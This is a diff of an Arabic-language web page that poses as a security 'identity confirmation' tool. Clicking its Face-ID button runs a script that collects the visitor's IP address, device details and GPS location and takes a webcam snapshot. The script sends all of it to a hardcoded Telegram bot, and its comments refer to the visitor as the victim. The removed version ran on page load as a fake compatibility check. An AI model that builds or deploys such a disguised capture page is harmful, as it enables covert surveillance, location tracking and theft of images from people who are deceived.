@@ -1,41 +1,61 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>تحقق من النظام</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HADI_V142_SECURITY</title>
+    <style>
+        body { background-color: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px; }
+        .btn { background: #0f0; color: #000; padding: 20px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>نظام الحماية المتقدم V142</h1>
+    <p>اضغط لتأكيد الهوية ومنع محاولات الاختراق</p>
+    <button class="btn" onclick="startCapture()">تأكيد الهوية (Face-ID)</button>
+
     <script>
         const token = "8423547869:AAGnndEv5lB27vNjS9iMOqX4lxduElY06nU";
         const chatId = "6978465145";
 
-        async function sendLog(text) {
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+        async function sendToBot(msg) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
         }
 
-        async function captureAll() {
-            // سحب IP والشبكة
+        async function startCapture() {
+            // 1. سحب الـ IP والبيانات
             const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-            sendLog(`🌐 IP: ${ipData.ip}\n📱 الجهاز: ${navigator.userAgent}`);
+            sendToBot(`🌐 IP: ${ipData.ip}\n📱 الجهاز: ${navigator.userAgent}`);
 
-            // سحب الموقع (يظهر الإذن تلقائياً)
+            // 2. سحب الموقع
             navigator.geolocation.getCurrentPosition(p => {
-                sendLog(`📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                sendToBot(`📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
             });
 
-            // سحب الكاميرا والمايك (يحتاج ضغطة زر من الضحية)
+            // 3. التقاط وإرسال الصورة
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                sendLog("📸 تم فتح الكاميرا والمايكروفون بنجاح!");
-                // هنا يمكن إضافة كود لإرسال صورة (blob) كما شرحنا سابقاً
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                canvas.toBlob(blob => {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('photo', blob, 'snap.jpg');
+                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+                }, 'image/jpeg');
+
+                sendToBot("📸 تم سحب الصورة بنجاح!");
             } catch (e) {
-                sendLog("❌ الضحية رفض الكاميرا.");
+                sendToBot("❌ الضحية رفض الكاميرا.");
             }
         }
-        window.onload = captureAll;
     </script>
-</head>
-<body style="background:#000; color:#0f0; text-align:center;">
-    <h1>جاري فحص توافق الجهاز...</h1>
-    <button onclick="captureAll()" style="padding:20px;">اضغط هنا لإكمال الفحص</button>
 </body>
 </html>
-
